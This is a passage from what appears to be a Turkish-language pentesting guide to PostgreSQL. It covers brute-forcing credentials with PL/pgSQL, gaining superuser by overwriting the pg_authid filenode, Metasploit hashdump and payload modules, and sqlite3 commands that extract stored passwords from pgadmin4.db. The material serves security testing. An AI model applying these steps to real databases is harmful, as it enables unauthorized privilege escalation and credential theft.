Ve sonra **komutları çalıştırın**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL ile Parola Kırma

**PL/pgSQL**, SQL'e kıyasla daha fazla prosedürel kontrol sunan **tam özellikli bir programlama dilidir**. Program mantığını geliştirmek için **döngüler** ve diğer **kontrol yapıları** kullanma imkanı sağlar. Ayrıca, **SQL ifadeleri** ve **tetikleyiciler**, **PL/pgSQL dili** kullanılarak oluşturulan fonksiyonları çağırma yeteneğine sahiptir. Bu entegrasyon, veritabanı programlama ve otomasyonu için daha kapsamlı ve çok yönlü bir yaklaşım sağlar.\
**Bu dili, PostgreSQL'den kullanıcı kimlik bilgilerini brute-force yapmasını istemek için kötüye kullanabilirsiniz.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### İç PostgreSQL Tablolarını Üzerine Yazarak Privesc

> [!NOTE]
> Aşağıdaki privesc vektörü, tüm adımların iç içe geçmiş SELECT ifadeleri aracılığıyla gerçekleştirilebilmesi nedeniyle, kısıtlı SQLi bağlamlarında özellikle yararlıdır.

Eğer **PostgreSQL sunucu dosyalarını okuyup yazabiliyorsanız**, `pg_authid` tablosuyla ilişkili PostgreSQL disk üzerindeki filenode'u üzerine yazarak **süper kullanıcı** olabilirsiniz.

**Bu teknik hakkında daha fazla bilgi edinin** [**burada**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Saldırı adımları şunlardır:

1. PostgreSQL veri dizinini elde edin
2. `pg_authid` tablosuyla ilişkili filenode için bir göreli yol elde edin
3. `lo_*` fonksiyonları aracılığıyla filenode'u indirin
4. `pg_authid` tablosuyla ilişkili veri tipini alın
5. [PostgreSQL Filenode Editörü](https://github.com/adeadfed/postgresql-filenode-editor) kullanarak [filenode'u düzenleyin](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); tam izinler için tüm `rol*` boolean bayraklarını 1 olarak ayarlayın.
6. Düzenlenmiş filenode'u `lo_*` fonksiyonları aracılığıyla yeniden yükleyin ve diskteki orijinal dosyayı üzerine yazın
7. _(İsteğe bağlı)_ Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin
8. Artık tam bir süperadminin ayrıcalıklarına sahip olmalısınız.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

_**postgresql.conf**_ dosyasının içinde postgresql günlüklerini etkinleştirmek için şunu değiştirebilirsiniz:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Sonra, **servisi yeniden başlatın**.

### pgadmin

[pgadmin](https://www.pgadmin.org), PostgreSQL için bir yönetim ve geliştirme platformudur.\
_**pgadmin4.db**_ dosyasının içinde **şifreleri** bulabilirsiniz.\
Bunları, script içindeki _**decrypt**_ fonksiyonunu kullanarak çözebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

PostgreSQL'de istemci kimlik doğrulaması, **pg_hba.conf** adlı bir yapılandırma dosyası aracılığıyla yönetilmektedir. Bu dosya, her biri bir bağlantı türü, istemci IP adresi aralığı (varsa), veritabanı adı, kullanıcı adı ve eşleşen bağlantılar için kullanılacak kimlik doğrulama yöntemini belirten bir dizi kayıt içerir. Bağlantı türü, istemci adresi, istenen veritabanı ve kullanıcı adı ile eşleşen ilk kayıt kimlik doğrulama için kullanılır. Kimlik doğrulama başarısız olursa geri dönüş veya yedek yoktur. Hiçbir kayıt eşleşmezse, erişim reddedilir.

pg_hba.conf'de mevcut olan şifre tabanlı kimlik doğrulama yöntemleri **md5**, **crypt** ve **password**'dır. Bu yöntemler, şifrenin iletilme şekli açısından farklılık gösterir: MD5-hashlenmiş, crypt-şifrelenmiş veya düz metin. Crypt yönteminin, pg_authid'de şifrelenmiş şifrelerle kullanılamayacağını belirtmek önemlidir.

{{#include ../banners/hacktricks-training.md}}
